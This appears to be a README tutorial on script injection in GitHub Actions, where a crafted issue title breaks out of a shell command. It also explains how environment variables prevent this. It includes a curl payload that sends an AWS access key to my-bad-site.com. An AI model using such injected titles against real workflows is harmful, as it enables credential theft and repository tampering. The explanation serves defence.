# Example Repo

This is a super simple example repository!


--------------------- 1 --------------------------

When I create an issue titeled < a";echo Got your secrets" >
The workflow is triggered, after it finished running: 'Got your secrets' is being output here.

Because I injected some code that was executed : because of the title I set, because what my title did to this Workflow, is the way I wrote it: a";echo Got your secrets"

This first double quote here simply closes the double quotes related to the first line of my run command:

--------------------------------------------------
run: |
    issue_title="${{ github.event.issue.title }}"

--------------------------------------------------

So here I have an opening double quote, then this double quote after a, simply closes it.
So what I'm doing with this title here is I'm setting issue title to just a.

Then I add this semi colon ; to start a new command and that new command is simply that output: echo Got your secrets.

And then I got one double quote (the second one) so that overall I am simply closing this entire statement, and I make sure that my job won't fail, that my step won't fail.

But here, I'm then executing this injected command, this echo command, and of course an echo command isn't too harmful, 
but it was just an example.

I could also open an issue where I use the same trick to use **curl**, which can be used to send an HTTP request, to send a request to my-bad-site.com. And append some query parameter, for example, ABC which I set equal to the interpolated AWS access key ID variable.
( Issue Title : a";curl http://my-bad-site.com?abc=$AWS_ACCESS_KEY" ) 
If I know that your Workflow uses this environment variable, I can extract it, and send it to my own website like this by injecting this code.

I could be extracting any environment variable here, and I could be doing all kinds of other things.
I could write a command that looks into your code base and extracts data from there, or uses the GitHub REST API to change some action,
or Repository settings.

I could be injecting any kind of code, that's why this is really dangerous.

--------------------- 2 --------------------------

Now protecting against this attack is quite easy though.

1. You could be using some **action** instead of your own command:
If you had an action that does what you wanna do, that would be better because if you just passed a title as an input to the action, it will not be executed in any shell, but instead it will be extracted and handled by GitHub, and will never reach a shell.

But if you must use your own command, it's better to add an **environment variable**, for example :

-------------------------------------------------
env:
    ISSUE_TITLE: ${{ github.event.issue.title }}

-------------------------------------------------

If I do that, we'll no longer have this injection problem because now this title, the title that's set for the issue will be evaluated and used outside of this shell.

It will of course then still use the title, but it will be treated as text here, as a string, and it will not interact with this script generation process.

With this approach here, if I create an issue with exactly that title again, which previously did run that echo command, if I create another issue and therefore of course my actions execute again, we will see that the script injection example will now still execute.